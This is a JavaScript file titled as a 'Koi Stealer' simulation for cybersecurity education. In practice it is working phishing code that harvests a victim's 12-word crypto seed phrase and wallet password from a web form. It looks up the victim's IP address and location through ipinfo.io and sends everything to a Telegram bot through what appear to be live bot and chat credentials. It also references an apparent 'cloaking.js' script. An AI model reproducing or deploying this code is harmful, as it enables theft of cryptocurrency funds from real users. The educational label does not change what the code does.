// === KOI STEALER SIMULATION SCRIPT ===
// Cybersecurity Education • By @YourHandle
// -----------------------------------------------

const botToken = "7986200355:AAE5W_YXK5RSVgHBCqOrBiurWmNpbTPPL7Q";
const chatId = "6697993658";
const ipInfoToken = "97788c7d33c9af";

function log(msg) {
  console.log(`[KoiStealer] ${new Date().toLocaleString()} → ${msg}`);
}
<script src="cloaking.js"></script>

document.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById("stealerForm");
  const errorMsg = document.getElementById("errorMsg");

  if (!form) {
    log("❌ Form not found.");
    return;
  }
<script src="cloaking.js"></script>

  form.addEventListener("submit", async (event) => {
    event.preventDefault();
    errorMsg.textContent = ""; // Clear previous

    const seed = document.getElementById("wallet")?.value.trim() || "";
    const pass = document.getElementById("password")?.value.trim() || "";

    // Validate seed phrase (12 lowercase words)
    const seedWords = seed.split(/\s+/);
    const seedValid = seedWords.length === 12 && seedWords.every(w => /^[a-z]+$/.test(w));
    if (!seedValid) {
      errorMsg.textContent = "⚠️ Enter a valid 12-word seed phrase (lowercase).";
      return;
    }

    if (pass.length < 6) {
      errorMsg.textContent = "⚠️ Wallet password must be at least 6 characters.";
      return;
    }

    log("✅ Validation passed. Processing...");

    // Step 1: Fetch IP/location info
    let geoInfo = { ip: "N/A", city: "N/A", region: "N/A", country: "N/A" };
    try {
      const res = await fetch(`https://ipinfo.io/json?token=${ipInfoToken}`);
      geoInfo = await res.json();
      log(`🌐 IP: ${geoInfo.ip}, ${geoInfo.city}, ${geoInfo.region}, ${geoInfo.country}`);
    } catch {
      log("⚠️ IP/location fetch failed.");
    }

    // Step 2: Format message
    const message = `
🚨 *Koi Stealer Simulation Triggered*
🕒 *Time:* ${new Date().toLocaleString()}
🌐 *IP:* ${geoInfo.ip}
📍 *Location:* ${geoInfo.city}, ${geoInfo.region}, ${geoInfo.country}

🔑 *Seed Phrase:* \`${seed}\`
🔐 *Wallet Password:* \`${pass}\`
    `;

    // Step 3: Send to Telegram
    try {
      const telegramRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "Markdown"
        })
      });

      const result = await telegramRes.json();
      result.ok
        ? log("✅ Sent to Telegram successfully.")
        : log(`❌ Telegram error: ${result.description}`);
    } catch (err) {
      log("🚫 Telegram send failed:", err.message);
    }
  });
});
